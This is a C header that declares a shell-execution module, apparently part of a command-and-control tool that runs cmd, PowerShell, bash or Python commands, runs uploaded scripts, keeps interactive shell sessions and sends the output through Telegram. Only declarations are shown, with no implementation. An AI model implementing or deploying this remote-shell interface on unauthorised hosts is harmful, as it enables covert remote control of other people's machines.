/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#ifndef C2T_SHELL_H
#define C2T_SHELL_H

#include <stddef.h>
#include <stdint.h>
#include <stdatomic.h>

#define C2T_SHELL_DEFAULT_TIMEOUT_MS 30000U
#define C2T_SHELL_SCRIPT_TIMEOUT_MS 60000U
#define C2T_SHELL_MAX_OUTPUT_BYTES (1024U * 1024U)

typedef enum {
  C2T_SHELL_AUTO = 0,
  C2T_SHELL_CMD,
  C2T_SHELL_POWERSHELL,
  C2T_SHELL_BASH,
  C2T_SHELL_SH,
  C2T_SHELL_ZSH,
  C2T_SHELL_PYTHON
} c2t_shell_type_t;

typedef struct {
  int exit_code;
  int timed_out;
  int cancelled;
  int execution_error;
  char *output;
  size_t output_len;
  uint64_t duration_ms;
} c2t_shell_result_t;

typedef struct {
  const char *command;
  c2t_shell_type_t shell_type;
  const char *stdin_data;
  size_t stdin_data_len;
  uint32_t timeout_ms;
  const char *working_dir;
  const atomic_int *cancel_requested;
} c2t_shell_options_t;

typedef struct {
  int is_active;
  c2t_shell_type_t shell_type;
  uint64_t pid;
  uint64_t start_time_ms;
  uint64_t last_activity_ms;
  uint64_t total_input_bytes;
  uint64_t total_output_bytes;
  char shell_name[32];
} c2t_shell_session_info_t;

[[nodiscard]] int c2t_shell_execute(const char *command,
                                    c2t_shell_result_t *result,
                                    uint32_t timeout_ms);

[[nodiscard]] int c2t_shell_execute_ex(const c2t_shell_options_t *options,
                                       c2t_shell_result_t *result);

[[nodiscard]] int c2t_shell_execute_script_file(const char *script_path,
                                                const char *args,
                                                c2t_shell_result_t *result,
                                                uint32_t timeout_ms);

void c2t_shell_result_free(c2t_shell_result_t *result);

[[nodiscard]] int c2t_shell_format_telegram(const char *command,
                                            const c2t_shell_result_t *result,
                                            char *output, size_t capacity);

[[nodiscard]] int c2t_shell_run_and_send(const char *command);

[[nodiscard]] int c2t_shell_run_powershell_and_send(const char *command);

[[nodiscard]] int c2t_shell_run_bash_and_send(const char *command);

[[nodiscard]] int c2t_shell_run_cmd_and_send(const char *command);

[[nodiscard]] int c2t_shell_run_python_and_send(const char *command);

[[nodiscard]] int c2t_shell_run_with_input_and_send(const char *command,
                                                    const char *stdin_data);

[[nodiscard]] int c2t_shell_run_script_file_and_send(const char *script_path,
                                                     const char *args);

[[nodiscard]] int c2t_shell_run_uploaded_script(const char *file_id,
                                                const char *file_name,
                                                const char *caption);

/* Interactive Shell Session Management */
[[nodiscard]] int c2t_shell_session_start(c2t_shell_type_t shell_type,
                                          char *out_msg, size_t out_msg_cap);

[[nodiscard]] int c2t_shell_session_write(const char *input, size_t input_len,
                                          c2t_shell_result_t *result,
                                          uint32_t wait_ms);

[[nodiscard]] int c2t_shell_session_stop(char *out_msg, size_t out_msg_cap);

int c2t_shell_session_get_info(c2t_shell_session_info_t *info);

int c2t_shell_session_handle_command(const char *subcommand, const char *arg);

#endif
